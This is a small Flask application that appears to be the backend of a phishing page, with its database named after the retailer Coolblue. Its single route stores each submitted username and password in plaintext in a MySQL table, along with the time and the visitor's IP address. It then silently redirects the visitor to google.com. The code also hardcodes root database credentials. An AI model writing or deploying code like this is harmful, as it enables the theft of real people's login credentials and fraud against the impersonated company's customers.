from flask import Flask, render_template, request, redirect
import mysql.connector
from datetime import datetime

app=Flask(__name__)

db = mysql.connector.connect(
host="host.docker.internal",
port="3300",
user="root",
password="secret",
database="coolblue"
)
dbcursor = db.cursor()

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST' and 'UserName' in request.form and 'Password' in request.form:
        username = request.form['UserName']
        password = request.form['Password']
        now = datetime.now()
        ip = request.remote_addr
        dbcursor.execute("""INSERT INTO loginData(username, password, time, ipaddres) VALUES (%s, %s, %s, %s);""" ,(username, password, now , str(ip)))
        db.commit()
        return redirect("http://www.google.com/", code=302)
    else:
        return render_template("index.html")